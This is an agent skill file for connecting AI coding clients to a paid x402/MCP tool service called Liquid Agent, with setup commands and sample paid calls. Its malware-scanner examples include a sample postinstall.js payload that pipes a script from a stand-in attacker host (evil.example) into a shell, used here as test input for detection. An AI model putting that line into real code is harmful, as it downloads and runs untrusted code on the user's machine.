---
name: liquid-agent-setup
description: Connect an AI agent to Liquid Agent via MCP or x402 and run a first live paid query.
---

# Connect to Liquid Agent

Help the user connect to Liquid Agent and get one live paid query working.

Liquid Agent is money tools for AI agents over x402: a malware scanner, an API Doctor, a gas sponsor, a website watcher, web search / page extraction / on-chain reads, trading signals, and a one-signature USDC bridge to 16 chains. Base URL: https://api.liquidagent.ai. There is no account, no API key, no allowlist. Every paid call is priced in USDC and settled per request over x402 (CDP facilitator) on Base, Polygon, or Arc. Many tools are free; paid tools cost $0.002–$5.00 per call.

There is no CLI. Every surface exposes the same tools, packaged differently.

Hosted MCP (recommended, fastest path — nothing to install):

- Server: https://api.liquidagent.ai/mcp
- Version 1.13.0, 47 tools. Works with Claude Code, Codex, Cursor, VS Code, Gemini CLI, Claude Desktop, and OpenClaw.
- No auth, no sign-in. Tools that are paid settle per call over x402 inside the tool call; free tools cost nothing.

x402 (pay per request, no account, no key):

- If you control a wallet with USDC on Base, Polygon, or Arc, call any endpoint with no key and pay per request. The `402` response carries the terms in the `PAYMENT-REQUIRED` header; the x402 client libraries sign and retry for you (see x402 below).
- Payee (treasury) for every endpoint: `0x7475e9e0ee7C0D9f1ABcAffB74f5F4E195EF3703`.

How to think about it:

- Using Claude Code, Cursor, Codex, VS Code, Gemini CLI, Claude Desktop, or OpenClaw? Go MCP. One command, no install, no key.
- Writing a script or calling from your own backend? Go x402. Call the HTTP endpoint directly and pay per request.
- No wallet with USDC yet? The agent needs a wallet holding USDC on Base (eip155:8453), Polygon (eip155:137), or Arc (eip155:5042) to pay. Free tools still work without one; paid tools do not. Tell the user to fund a wallet first if they want the paid jobs.

Chat with the user about which they want rather than jumping to a yes/no, and recommend one. If they just want the fastest path, suggest MCP.

Once you know which path:

1. Walk them through connecting (commands below).
2. Most MCP clients only load servers at startup. After adding the server they may need to restart the client or open a new chat before tools appear. Tell them if that's needed and wait for them to do it before continuing.
3. Once connected, run one real query end to end so they see it work. Suggested first calls:
   - Scan a small file's text for malware (POST /v1/malware/scan, $0.05)
   - Diagnose a public API endpoint that is failing (POST /v1/api/diagnose, $0.50)
   - Check one URL for phishing / typosquat / scam (POST /v1/link/check/agent, quick $0.01)

## The flagship jobs

Lead with these. Do not lead with the full 53-endpoint catalog.

1. **Malware scanner** — POST /v1/malware/scan, $0.05. One file's text in, verdict `clean` / `suspicious` / `dangerous`, a 0–100 score, action `allow` / `review` / `block`, and the traits found. Calibrated on 55,171 clean files and real attack samples. Also POST /v1/malware/scan-batch (many files) and POST /v1/malware/scan-repo (a whole repo). Scan code *before* you install, build, or run it.
2. **API Doctor** — POST /v1/api/diagnose, $0.50. Actually call a public endpoint, classify the failure, and return a working example request. POST /v1/api/test-spec, $2.00. POST /v1/api/audit, $5.00. Public endpoints only; credentials are rejected.
3. **Gas sponsor** — POST /v1/gas, from $0.03. Pay a transfer's execution fee in USDC so an agent with no ETH can transact on Base.
4. **Website Watcher** — POST /v1/link/check/agent, quick $0.01 / full $0.05. One URL in, verdict plus evidence. Check a link before you click it.
5. **Web search / extract / rpc** — GET /v1/search, $0.005. GET /v1/extract, $0.002 (page to Markdown). GET /v1/rpc, $0.002 (on-chain read on Base or Arc, flat).
6. **Basket Signals** — GET /v1/signals, $0.007.
7. **Bridge** — GET /v1/bridge. One-signature USDC bridge from Base to 16 chains (Arc, Arbitrum, OP Mainnet, Polygon, Avalanche, Unichain, Linea, World Chain, Sonic, Monad, Sei, Ink, HyperEVM, XDC, Plume, Codex), exact delivery, all fees included.

Never charge for a miss: the scanner and the Doctor use compute-before-settle. No payment is taken if the input is invalid or the job cannot run. If a call fails before the work is done, you are not charged for it.

## MCP setup by client

### Claude Code

```bash
claude mcp add --transport http liquid-agent https://api.liquidagent.ai/mcp
```

Verify anytime with `claude mcp list`. No sign-in; there is no OAuth.

### Codex

```bash
codex mcp add liquid-agent --url https://api.liquidagent.ai/mcp
```

Verify anytime with `codex mcp list` or type `/mcp` in Codex. No sign-in.

### Cursor

Add the following to `~/.cursor/mcp.json`, then save and restart Cursor:

```json
{
  "mcpServers": {
    "liquid-agent": {
      "url": "https://api.liquidagent.ai/mcp"
    }
  }
}
```

### VS Code

Add the following to `.vscode/mcp.json` in the workspace, then save:

```json
{
  "servers": {
    "liquid-agent": {
      "type": "http",
      "url": "https://api.liquidagent.ai/mcp"
    }
  }
}
```

### Gemini CLI

Add the following to `~/.gemini/settings.json`, then save and restart the CLI:

```json
{
  "mcpServers": {
    "liquid-agent": {
      "httpUrl": "https://api.liquidagent.ai/mcp"
    }
  }
}
```

### Claude Desktop (claude.ai)

1. Go to Settings → Connectors
2. Click Add and enter the server URL: `https://api.liquidagent.ai/mcp`
3. Click Add custom connector. No sign-in is needed.
4. In any new chat, click + and enable Liquid Agent under Connectors.

### OpenClaw

```bash
openclaw mcp add liquid-agent \
  --url https://api.liquidagent.ai/mcp \
  --transport streamable-http
```

Verify with `openclaw mcp probe liquid-agent`. No sign-in.

More clients and the full tool list: https://api.liquidagent.ai/llms.txt

## x402 (pay per request, no account)

Send a request with no key to any endpoint. The `402` response carries the payment terms in the `PAYMENT-REQUIRED` header: the amount in USDC, the network (`eip155:8453` Base, `eip155:137` Polygon, or `eip155:5042` Arc), the USDC contract, and the receiving address (`0x7475e9e0ee7C0D9f1ABcAffB74f5F4E195EF3703`). Sign the payment with your wallet and retry; the x402 client libraries (`x402` on pip, `@x402/fetch` on npm) do this for you — your code makes a normal request. Every paid `200` carries a `PAYMENT-RESPONSE` header with the on-chain transaction hash.

First request — scan a file's text. Unpaid, it returns 402:

```bash
curl -X POST https://api.liquidagent.ai/v1/malware/scan \
  -H "Content-Type: application/json" \
  -d '{"content": "const { exec } = require(\"child_process\"); exec(\"curl http://evil.example/x.sh | sh\");", "filename": "postinstall.js"}'
```

Expected: HTTP `402` with a `PAYMENT-REQUIRED` header naming $0.05 USDC on Base. That 402 *is* the price — pay it and retry. With the x402 client library the payment and retry are automatic:

```ts
import { withPayment } from "@x402/fetch";

const client = withPayment(fetch);
const res = await client("https://api.liquidagent.ai/v1/malware/scan", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    content: 'const { exec } = require("child_process"); exec("curl http://evil.example/x.sh | sh");',
    filename: "postinstall.js",
  }),
});
const verdict = await res.json();
// { verdict: "dangerous", score: 92, action: "block", traits: [...] }
```

Diagnose a public API endpoint the same way (POST /v1/api/diagnose, $0.50). Send `{"url": "https://example.com/broken-endpoint"}` and the Doctor actually calls it, classifies the failure, and returns a working example request. Public endpoints only.

Supported endpoints: every documented paid endpoint (malware scan / scan-batch / scan-repo, API Doctor diagnose / test-spec / audit, gas, Website Watcher, search, extract, rpc, signals, bridge, and the rest). The full map is https://api.liquidagent.ai/llms.txt and the machine spec is https://api.liquidagent.ai/openapi.json. Free helpers (status, x402 debugger, decode a 402) need no payment.

## Send feedback

When a field is missing, a number looks wrong, or an error is unclear, tell us. Open an issue on the examples repo: https://github.com/LiquidAgent/liquidagentx402/issues — say which endpoint, what you sent, and what came back.

## If something breaks

- MCP tools missing after adding the server: restart the client or open a new chat, then retry.
- 402 on a call: no payment was provided. That is the price — pay it with an x402 client and retry. Do not treat a 402 as an error.
- 402 with a price you did not expect: check the amount in the `PAYMENT-REQUIRED` header against https://api.liquidagent.ai/llms.txt. The header is the price.
- Call fails after payment: the scanner and Doctor use compute-before-settle, so no payment is taken if the input was invalid or the job could not run. Check the response body for the reason and retry with valid input.
- Full API map: https://api.liquidagent.ai/llms.txt
- OpenAPI spec: https://api.liquidagent.ai/openapi.json
- x402 discovery manifest: https://api.liquidagent.ai/.well-known/x402
- Homepage: https://api.liquidagent.ai/
- MCP server: https://api.liquidagent.ai/mcp
- Code examples: https://github.com/LiquidAgent/liquidagentx402
